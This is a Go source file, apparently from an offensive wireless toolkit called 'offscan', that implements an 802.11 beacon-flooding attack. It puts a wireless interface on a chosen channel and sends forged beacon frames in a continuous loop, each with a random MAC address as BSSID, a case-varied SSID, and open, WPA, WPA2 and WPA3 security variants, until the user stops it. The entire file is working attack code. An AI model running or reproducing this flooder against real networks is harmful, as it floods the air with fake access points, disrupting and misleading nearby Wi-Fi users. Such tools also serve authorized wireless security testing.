/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package beacon

import (
	"fmt"
	"net"
	"time"

	"offscan/internal/frame80211/builder"
	"offscan/internal/generators"
	"offscan/internal/ifconfig"
	"offscan/internal/sockets"
	"offscan/internal/utils"
)



func Run(args []string) {
    newBeaconFlooder(args).execute()
}



type beaconFlood struct {
    channel   uint8
    ssid      string
    bcSent    int
    socket    sockets.Layer2Socket
    builder   builder.Beacon
    randGen   generators.RandomValues
}



func newBeaconFlooder(argList []string) *beaconFlood {
    parser := newParser()
    parser.parseBcFloodArgs(argList)

    ifconfig.MustSetChannel(&parser.iface, parser.channel)

    return &beaconFlood{
        channel : uint8(parser.channel),
        ssid    : parser.ssid,
        bcSent  : 0,
        builder : builder.NewBeacon(),
        socket  : sockets.NewL2Socket(&parser.iface),
        randGen : generators.NewRandomValues(),
    }
}



func (bf *beaconFlood) execute() {
    ctx   := utils.SignalContext()
    start := time.Now()
    
	fmt.Println("[+] Sending beacons. Press Ctrl+C to stop")

    for {
        select {
        case <-ctx.Done():
            elapsed := time.Since(start).Seconds()
            bf.closeSocket()
            bf.displayExecInfo(elapsed)
            return

        default:
            bf.sendBeacons()
        }
    }
}



func (bf *beaconFlood) sendBeacons() {
    bssid := bf.randGen.RandomMac()
    ssid  := bf.randGen.RandomCaseInversion(bf.ssid)
    seq   := bf.randGen.RandomSeq()
    bf.sendQuartet(bssid, ssid, seq)
}



func (bf *beaconFlood) sendQuartet(bssid net.HardwareAddr, ssid string, seq uint16) {
    bf.sendBeacon(bssid, ssid, seq,   "open")
    bf.sendBeacon(bssid, ssid, seq+1, "wpa")
    bf.sendBeacon(bssid, ssid, seq+2, "wpa2")
    bf.sendBeacon(bssid, ssid, seq+3, "wpa3")
}



func (bf *beaconFlood) sendBeacon(bssid net.HardwareAddr, ssid string, seq uint16, sec string) {
    beacon := bf.builder.Beacon(bssid, ssid, seq, bf.channel, sec)
    bf.socket.Send(beacon)
    bf.bcSent++
}



func (bf *beaconFlood) displayExecInfo(elapsed float64) {
    fmt.Printf("\n[-] Flood interrupted\n")
    fmt.Printf("[%%] %d beacons sent in %.2f seconds\n", bf.bcSent, elapsed)
}



func (bf *beaconFlood) closeSocket() {
    if err := bf.socket.Close(); err != nil {
        fmt.Printf("[!] Error closing socket: %v\n", err)
    }
}